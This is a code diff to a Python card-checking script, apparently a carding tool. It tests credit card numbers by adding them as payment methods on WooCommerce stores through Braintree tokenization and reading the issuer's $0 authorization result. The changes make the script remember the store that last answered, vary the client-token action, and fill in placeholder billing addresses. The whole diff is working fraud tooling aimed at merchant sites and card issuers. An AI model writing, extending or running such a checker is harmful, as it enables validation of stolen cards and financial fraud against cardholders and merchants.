@@ -80,6 +80,37 @@ def account_stores():
     return out
 
 
+# The store that answered last.  Only one store is asked, so the check
+# does not pay for a store that cannot answer on every card.
+CHOSEN_FILE = os.environ.get("B3_WC_CHOSEN_FILE") or "/root/hitchecker/braintree_chosen.json"
+
+
+def _chosen_store(stores):
+    """The stores in the order they are tried: the one that answered first."""
+    chosen = ""
+    try:
+        with open(CHOSEN_FILE, encoding="utf-8") as f:
+            chosen = (json.load(f) or {}).get("url", "")
+    except Exception:
+        chosen = ""
+    if chosen:
+        for i, s in enumerate(stores):
+            if s.get("url") == chosen:
+                return [s] + [x for x in stores if x.get("url") != chosen]
+    return stores
+
+
+def _remember_store(url):
+    """Keep the store that answered, so the next card asks it first."""
+    if not url:
+        return
+    try:
+        with open(CHOSEN_FILE, "w", encoding="utf-8") as f:
+            json.dump({"url": url}, f)
+    except Exception:
+        pass
+
+
 # The answer, in the words the operator's own script uses.
 def _verdict_from_reason(reason):
     """Turn the store's reason into a verdict and the wording for it.
@@ -789,13 +820,16 @@ async def _wc_account_check(client, site, cc, mm, yy, cvv):
     #    out of reach.
     fingerprint = site.get("fingerprint") or ""
     if not fingerprint:
+        if not client_token_nonce:
+            return None, "the store gave no client token nonce", None
         r = await client.post(
             f"{base}/wp-admin/admin-ajax.php",
             headers={**headers_page,
                      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                      "Origin": base, "Referer": f"{base}/my-account/add-payment-method/",
                      "X-Requested-With": "XMLHttpRequest"},
-            data={"action": "wc_braintree_credit_card_get_client_token",
+            data={"action": (site.get("client_token_action")
+                             or "wc_braintree_credit_card_get_client_token"),
                   "nonce": client_token_nonce})
         try:
             ajax = r.json()
@@ -817,8 +851,13 @@ async def _wc_account_check(client, site, cc, mm, yy, cvv):
                                "sessionId": session_id},
         "query": TOKENIZE_QUERY,
         "variables": {"input": {
-            "creditCard": {"number": cc, "expirationMonth": mm,
-                           "expirationYear": yy, "cvv": cvv},
+            "creditCard": {
+                "number": cc, "expirationMonth": mm,
+                "expirationYear": yy, "cvv": cvv,
+                "billingAddress": {
+                    "postalCode": site.get("postal_code") or "10080",
+                    "streetAddress": site.get("street_address") or "moksdfjh",
+                }},
             "options": {"validate": False}}},
         "operationName": "TokenizeCreditCard",
     }
@@ -920,16 +959,12 @@ async def check_card_braintree(cc, mm, yy, cvv, proxy=None):
     if proxy and os.environ.get("B3_USE_PROXY", "").strip() == "1":
         client_kwargs["proxy"] = proxy
 
-    # The braintree auth asks ONE store: the one the operator named.
-    # The list of old sites is not walked here any more.
-    sites = []
-
     try:
         async with httpx.AsyncClient(**client_kwargs) as client:
             # 0. the WooCommerce account.  The card is added as a payment
             #    method and the store asks the issuer to verify it, so
             #    the answer is the issuer's and it is a real $0 auth.
-            for account in account_stores():
+            for account in _chosen_store(account_stores()):
                 if not account.get("url") or not account.get("user"):
                     continue
                 for attempt in (1, 2):
@@ -940,6 +975,7 @@ async def check_card_braintree(cc, mm, yy, cvv, proxy=None):
                     except Exception as e:
                         verdict, detail, card_info = None, f"{type(e).__name__}: {str(e)[:60]}", None
                     if verdict:
+                        _remember_store(account.get("url"))
                         info = _parse_card_info(card_info) if card_info else "??"
                         return f"{verdict} - {detail} | {info} [{elapsed}s]"
                     wait = _wait_seconds(detail)
@@ -1212,7 +1248,7 @@ async def check_card_braintree(cc, mm, yy, cvv, proxy=None):
                     continue
 
             elapsed = round(time.time() - start, 2)
-            return f"Error - All Braintree sites failed [{elapsed}s]"
+            return f"Error - No Braintree store could answer [{elapsed}s]"
 
     except (httpx.ConnectTimeout, httpx.ReadTimeout, httpx.WriteTimeout, httpx.PoolTimeout):
         elapsed = round(time.time() - start, 2)
